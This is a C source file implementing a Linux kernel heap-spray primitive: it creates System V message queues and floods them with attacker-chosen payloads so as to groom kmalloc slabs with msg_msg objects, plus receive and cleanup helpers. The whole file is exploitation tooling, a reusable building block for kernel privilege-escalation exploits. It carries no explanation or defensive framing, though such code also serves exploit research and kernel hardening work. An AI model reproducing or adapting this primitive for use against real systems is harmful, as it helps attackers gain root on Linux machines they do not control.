#define _GNU_SOURCE
#include <errno.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <unistd.h>

typedef struct {
    long mtype;
    char mtext[];
} msg_msg_heap_spray_msg_t;

typedef struct {
    int *queue_ids;
    size_t queue_count;
    size_t spray_rounds;
    size_t payload_size;
    long message_type;
    void *payload;
} msg_msg_heap_spray_ctx_t;

int init_msg_msg_heap_spray(msg_msg_heap_spray_ctx_t *ctx, size_t queue_count,
                            size_t payload_size, size_t spray_rounds) {
    size_t i;

    if (!ctx || !queue_count || !payload_size || !spray_rounds) {
        return -EINVAL;
    }

    memset(ctx, 0, sizeof(*ctx));
    ctx->queue_ids = malloc(sizeof(*ctx->queue_ids) * queue_count);
    ctx->payload = calloc(1, payload_size);
    if (!ctx->queue_ids || !ctx->payload) {
        return -ENOMEM;
    }

    ctx->queue_count = queue_count;
    ctx->spray_rounds = spray_rounds;
    ctx->payload_size = payload_size;
    ctx->message_type = 1;

    for (i = 0; i < queue_count; i++) {
        ctx->queue_ids[i] = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
        if (ctx->queue_ids[i] < 0) {
            return -errno;
        }
    }

    return 0;
}

int execute_msg_msg_heap_spray_send(msg_msg_heap_spray_ctx_t *ctx) {
    size_t i;
    size_t round;
    size_t alloc_size;
    msg_msg_heap_spray_msg_t *msg;

    if (!ctx || !ctx->queue_ids || !ctx->payload) {
        return -EINVAL;
    }

    alloc_size = sizeof(*msg) + ctx->payload_size;
    msg = malloc(alloc_size);
    if (!msg) {
        return -ENOMEM;
    }

    msg->mtype = ctx->message_type;
    memcpy(msg->mtext, ctx->payload, ctx->payload_size);

    for (round = 0; round < ctx->spray_rounds; round++) {
        for (i = 0; i < ctx->queue_count; i++) {
            if (msgsnd(ctx->queue_ids[i], msg, ctx->payload_size, 0) < 0) {
                free(msg);
                return -errno;
            }
        }
    }

    free(msg);
    return 0;
}

ssize_t execute_msg_msg_heap_spray_recv_one(msg_msg_heap_spray_ctx_t *ctx,
                                            size_t queue_index, void *buf,
                                            size_t buf_size, long msgtyp) {
    if (!ctx || !buf || queue_index >= ctx->queue_count) {
        return -EINVAL;
    }

    return msgrcv(ctx->queue_ids[queue_index], buf, buf_size, msgtyp, 0);
}

void cleanup_msg_msg_heap_spray(msg_msg_heap_spray_ctx_t *ctx) {
    size_t i;

    if (!ctx) {
        return;
    }

    if (ctx->queue_ids) {
        for (i = 0; i < ctx->queue_count; i++) {
            if (ctx->queue_ids[i] >= 0) {
                msgctl(ctx->queue_ids[i], IPC_RMID, NULL);
            }
        }
    }

    free(ctx->queue_ids);
    free(ctx->payload);
    memset(ctx, 0, sizeof(*ctx));
}
